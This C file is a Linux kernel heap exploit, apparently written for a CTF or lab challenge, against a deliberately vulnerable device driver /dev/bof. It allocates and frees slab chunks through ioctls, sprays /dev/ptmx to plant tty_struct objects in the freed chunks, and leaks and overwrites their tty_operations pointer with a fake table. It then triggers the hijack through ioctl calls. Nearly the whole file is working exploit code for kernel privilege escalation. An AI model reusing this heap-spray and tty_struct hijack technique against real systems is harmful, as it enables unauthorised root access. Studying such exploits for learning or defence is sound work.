#include "/root/kernel/template/template.h"

struct param{

	size_t len;
	char *buf;
	size_t idx;
};

void refactor(){

	;
}

int main(){

	printf("heap exploit kernel!\n");
	int fds[20];
	int ptmx_fds[0x100];
	char buf[8];
	int fd;

	//open 10 fds for next ioctl usage.
	for (int i = 0; i < 10 ; i++){
		
		fd  = open("/dev/bof", O_RDWR);
		if(fd == -1){
			perror("open device wrong" );
			return -1;
		}
		fds[i] = fd;
	}

	struct param p;
	p.len = 0x500;
	p.buf = malloc(p.len);

	//ioctl to kmalloc 10 0x500 chunk in slub.
	for(int i = 0; i < 10; i++){

		p.idx = i;
		ioctl(fds[i], 5, &p);
	}

	//free middle ones
	for(int i=5; i<9; i++){
		p.idx = i;
		ioctl(fds[i], 7, &p);
	}

	//spray /dev/ptmx! there'll be tty_struct on some slub chunks.
	for (int i=0; i<0x100; i++){
		ptmx_fds[i] = open("/dev/ptmx", O_RDWR|O_NOCTTY);
		if(ptmx_fds[i]==-1){
			perror("open ptmx error: ");
		}
	}	

	//assume already has got a tty_struct inside our backet.
	
	p.idx = 5;
	p.len = 0x20;
	ioctl(fds[4], 9, &p); //copy_to_user the first 32 bytes of potential tty_struct!!

	printf("show content of chunk 5:\n ");
	for (int i=0; i<16; i++){
		printf("%2x ", p.buf[i]);
	}
	
	printf("\n");

	//modify target pointers in batch 
	size_t *temp = (size_t *)&p.buf[24];	
	prepare_fake_tty_operations(temp);
//	*temp = (size_t)fake_tty_operation;
	for (int i=5; i<9; i++){
		p.idx = i;
		ioctl(fds[4], 8, &p);
	}

	//go!
	for (int i=0; i < 0x100; i++){
		ioctl(ptmx_fds[i], 0, 0);
	}

	return 0;
}
